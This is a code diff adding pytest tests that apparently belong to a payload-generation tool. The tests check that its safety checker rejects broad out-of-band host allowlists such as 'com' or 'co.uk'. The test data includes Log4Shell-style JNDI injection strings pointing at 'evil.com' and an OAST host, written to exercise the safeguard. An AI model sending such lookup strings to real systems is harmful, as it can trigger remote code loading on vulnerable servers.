@@ -336,6 +336,43 @@ class TestSafety:
         with pytest.raises(ap.AdversarialPayloadSafetyError, match="non-allowlisted host"):
             ap.check_payload_safety(bad, oob_hosts=("oast.fun",))
 
+    def test_safety_boundary_rejects_broad_oob_host_directly(self):
+        # The OOB-host contract is enforced at the SAFETY boundary, not only at the CLI: a broad
+        # value (bare TLD / public suffix) passed straight to check_payload_safety / resolve_value
+        # must be rejected — otherwise a payload host like evil.com would suffix-match `.com` and
+        # be allowlisted. (Regression for the review finding that the CLI sanitized but the safety
+        # path trusted whatever oob_hosts it was handed.)
+        val = "EFORGE_TEST ${jndi:ldap://evil.com/EFORGE_TEST}"
+        for broad in ("com", "fun", "local", "co.uk", "github.io"):
+            with pytest.raises(ap.AdversarialPayloadSafetyError):
+                ap.check_payload_safety(val, oob_hosts=(broad,))
+            with pytest.raises(ap.AdversarialPayloadSafetyError):
+                ap.resolve_value(None, val, seed_key="k", oob_hosts=(broad,))
+        # a concrete registrable OOB host is still accepted
+        ok = "EFORGE_TEST ${jndi:ldap://abc.oast.fun/EFORGE_TEST}"
+        ap.check_payload_safety(ok, oob_hosts=("oast.fun",))
+
+    def test_normalize_oob_host_contract(self):
+        # The single source of truth shared by the CLI and the safety boundary.
+        from evidenceforge.generation.adversarial_payload import normalize_oob_host
+
+        for bad in (
+            "com",
+            "fun",
+            "local",
+            "co.uk",
+            "github.io",
+            "http://x",
+            "a b",
+            "a..b",
+            "1.2.3.4.5",
+        ):
+            with pytest.raises(ap.AdversarialPayloadSafetyError):
+                normalize_oob_host(bad)
+        assert normalize_oob_host("OAST.fun") == "oast.fun"
+        assert normalize_oob_host("abc.github.io") == "abc.github.io"
+        assert normalize_oob_host("127.0.0.1") == "127.0.0.1"
+
 
 class TestNormalizeOobHosts:
     """The --oob-host boundary contract shared by `eforge generate` and `eforge validate`."""
